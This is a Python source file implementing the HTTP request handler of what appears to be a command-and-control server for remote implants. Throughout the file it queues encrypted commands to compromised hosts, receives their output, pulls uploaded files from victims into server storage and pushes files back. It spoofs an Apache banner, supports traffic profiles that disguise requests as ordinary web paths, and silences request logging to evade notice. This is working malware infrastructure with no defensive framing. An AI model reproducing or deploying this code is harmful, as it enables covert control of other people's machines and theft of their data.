from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from urllib.parse import unquote_plus, urlparse, parse_qs
from os import path
from c2.crypto.encryption import create_cipher
from c2.server.sessions import SessionManager
from config.profile_handler import load_profile, build_uri, build_request_headers


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


class C2Handler(BaseHTTPRequestHandler):
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    config = None
    session_mgr = None
    activity_log = None
    profile = None
    uri_map = None  # Maps request_type -> URI pattern string

    @property
    def cipher(self):
        if not hasattr(self, "_cipher"):
            self._cipher = create_cipher(self.config.encryption.key)
        return self._cipher

    def _init_uri_map(self):
        """Build a map of request_type -> URI base path for matching incoming requests."""
        if self.__class__.uri_map is not None:
            return

        self.__class__.uri_map = {}

        if self.profile:
            http_section = self.profile.get("http", {})
            for req_type in ("request", "file_request", "file_upload", "response", "cwd_response"):
                uri_pattern = http_section.get(req_type, {}).get("uri_pattern", "")
                self.__class__.uri_map[req_type] = uri_pattern
        else:
            self.__class__.uri_map = {
                "request": self.config.http.cmd_request_path,
                "file_request": self.config.http.file_request_path,
                "file_upload": self.config.http.file_upload_path,
                "response": self.config.http.response_path,
                "cwd_response": self.config.http.cwd_response_path,
            }

    def _extract_data_from_path(self, uri_map_key: str) -> str:
        """Extract the data portion from the request path.
        Works for both static patterns (e.g. /book?isbn=DATA) and profile patterns (e.g. /js/main.js?v=abc&data=DATA)."""
        self._init_uri_map()
        base_uri = self.uri_map.get(uri_map_key, "")

        if self.profile:
            parsed = urlparse(self.path)
            qs = parse_qs(parsed.query)
            if "data" in qs:
                return qs["data"][0]
            # Fall back to stripping the base URI
            if base_uri and self.path.startswith(base_uri):
                remainder = self.path[len(base_uri):]
                if remainder.startswith("?"):
                    remainder = remainder.split("&", 1)[-1] if "&" in remainder else ""
                return remainder
            return self.path
        else:
            # Static config: data is everything after the base URI
            if base_uri and self.path.startswith(base_uri):
                return self.path[len(base_uri):]
            return self.path

    def _match_path(self, uri_map_key: str) -> bool:
        """Check if the current request path matches a URI map key."""
        self._init_uri_map()
        base_uri = self.uri_map.get(uri_map_key, "")
        if not base_uri:
            return self.path == self.uri_map.get(uri_map_key, "/")
        return self.path.startswith(base_uri)

    def do_GET(self):
        self._init_uri_map()

        if self._match_path("request"):
            self._handle_cmd_request()
        elif self._match_path("file_request"):
            self._handle_file_request()
        else:
            print(f"{self.client_address[0]} accessed {self.path} via GET")

    def _handle_cmd_request(self):
        raw_client = self._extract_data_from_path("request")

        try:
            client_str = self.cipher.decrypt(raw_client.encode()).decode()
        except Exception:
            print(f"Failed to decrypt client identifier from {self.path}")
            self._http_response(400)
            return

        session_id = self.session_mgr.register_client(client_str)
        account, hostname = self.session_mgr.get_client_parts(session_id)

        if session_id == self.session_mgr.active_session_id:
            command = self.session_mgr.dequeue_command(session_id)
            if command is None:
                self._http_response(404)
                return

            self._http_response(200)
            self.wfile.write(self.cipher.encrypt(command.encode()))

            if self.activity_log:
                self.activity_log.log_command(session_id, command)

            if command.startswith("client kill"):
                with self.session_mgr.lock:
                    self.session_mgr.sessions.pop(session_id, None)
                print(f"{account}@{hostname} has been killed.")
        else:
            self._http_response(404)

    def _handle_file_request(self):
        raw_filepath = self._extract_data_from_path("file_request")

        try:
            filepath = self.cipher.decrypt(raw_filepath.encode()).decode()
        except Exception:
            print(f"Failed to decrypt filepath from {self.path}")
            self._http_response(400)
            return

        try:
            with open(filepath, "rb") as f:
                self._http_response(200)
                self.wfile.write(self.cipher.encrypt(f.read()))
        except (FileNotFoundError, OSError):
            print(f"{filepath} not found on server.")
            self._http_response(404)

    def do_POST(self):
        self._init_uri_map()

        if self._match_path("response"):
            data = self._handle_post_data()
            print(data)
            sid = self.session_mgr.active_session_id
            if self.activity_log:
                self.activity_log.log_command(sid, "", output=data)
        elif self._match_path("cwd_response"):
            self.session_mgr.active_cwd = self._handle_post_data()
        else:
            print(f"{self.client_address[0]} accessed {self.path} via POST")

    def do_PUT(self):
        self._init_uri_map()
        storage = self.config.server.storage_dir

        if self._match_path("file_upload"):
            content_length = self.headers.get("Content-Length")
            if not content_length:
                print("Missing Content-Length in PUT")
                self._http_response(400)
                return

            self._http_response(200)

            # For file upload, extract filename from the path
            file_upload_uri = self.uri_map.get("file_upload", "")
            if self.path.startswith(file_upload_uri + "/"):
                encrypted_filename = self.path[len(file_upload_uri) + 1:]
            else:
                encrypted_filename = self._extract_data_from_path("file_upload")

            try:
                filename = self.cipher.decrypt(encrypted_filename.encode()).decode()
            except Exception:
                print(f"Failed to decrypt filename from {self.path}")
                return

            filename = path.basename(filename)
            incoming_file = path.join(storage, filename)
            file_length = int(content_length)

            with open(incoming_file, "wb") as f:
                raw_data = self.rfile.read(file_length)
                try:
                    f.write(self.cipher.decrypt(raw_data))
                except Exception:
                    print(f"Failed to decrypt file data for {incoming_file}")
                    return
            print(f"{incoming_file} has been written to server.")
        else:
            print(f"{self.client_address[0]} accessed {self.path} via PUT")

    def _handle_post_data(self) -> str:
        from urllib.parse import unquote_plus

        content_length = self.headers.get("Content-Length")
        if not content_length:
            print("Missing Content-Length in POST")
            return ""

        self._http_response(200)
        content_length = int(content_length)
        client_data = self.rfile.read(content_length).decode()

        # Use the profile's post_key if available, else fall back to config
        response_key = self.config.http.response_key
        if self.profile:
            response_config = self.profile.get("http", {}).get("response", {})
            response_key = response_config.get("post_key", response_key)

        client_data = client_data.replace(f"{response_key}=", "", 1)
        client_data = unquote_plus(client_data)

        try:
            return self.cipher.decrypt(client_data.encode()).decode()
        except Exception:
            print("Failed to decrypt POST data")
            return ""

    def _http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        return
